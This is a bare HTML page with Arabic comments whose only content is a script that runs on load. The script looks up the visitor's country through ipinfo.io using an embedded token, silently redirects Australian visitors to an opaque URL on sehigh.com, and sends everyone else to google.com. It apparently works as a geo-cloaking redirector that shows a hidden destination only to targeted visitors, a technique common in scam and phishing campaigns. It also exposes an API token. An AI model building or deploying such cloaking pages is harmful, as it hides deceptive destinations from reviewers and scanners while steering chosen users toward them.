<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>work</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.js" integrity="sha512-cEgdeh0IWe1pUYypx4mYPjDxGB/tyIORwjxzKrnoxcif2ZxI7fw81pZWV0lGnPWLrfIHGA7qc964MnRjyCYmEQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

    <script>
        const allowedCountries = ['AU']; // غير الأستراليين يدخلوا

        $.get('https://ipinfo.io/json?token=396ec7a7e34187', function(data) {
            const ipAddress = data.ip;
            const country = data.country;

            console.log("IP Address:", ipAddress);
            console.log("Country:", country);

            if (allowedCountries.includes(country)) {
                window.location.href = "https://www.sehigh.com/DZRZX6W/2151XQRW/";
            } else {
                window.location.href = "https://google.com";
            }
        }).fail(function(error) {
            console.error('Error:', error);
            window.location.href = "https://google.com"; // fallback حتى إلا فشل الطلب
        });
    </script>
</head>
<body>
</body>
</html>
